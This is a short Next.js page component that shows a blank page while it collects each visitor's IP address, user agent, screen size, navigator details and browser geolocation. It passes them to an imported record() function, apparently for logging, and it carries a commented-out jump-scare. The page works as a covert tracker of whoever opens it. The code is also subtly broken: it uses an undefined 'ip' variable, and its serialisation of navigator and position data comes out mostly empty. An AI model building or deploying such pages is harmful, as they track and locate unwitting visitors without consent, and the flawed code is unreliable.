'use client'

import { useEffect, useState } from "react";
import record from "./record";

export default function Home() {
  const [showJumpScare, setShowJumpScare] = useState(false);

  useEffect(() => {
    // const timer = setTimeout(() => {
    //   setShowJumpScare(true);
    //   // Play the jump scare sound
    //   const audio = new Audio('/sound.mp3');
    //   audio.play();
    // }, 5000); // Jump scare after 5 seconds

    // return () => clearTimeout(timer);
  }, []);

  const additional = {}
  additional["ip"] = ip
  additional["userAgent"] = navigator.userAgent
  additional["screenResolution"] = `${window.innerWidth}x${window.innerHeight}`
  additional["navigator"] = navigator
  record(JSON.stringify(additional))
  useEffect(() => {
    (async () => {
      const ip = await (await fetch("https://api.ipify.org/?format=text")).text()
      console.log(ip)
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          record(JSON.stringify([position]))

        });
      } else {
        console.log("Geolocation is not supported by this browser.");
      }
    })()
  }, []);
  return (
    <main className="">
 
    </main>
  );
}
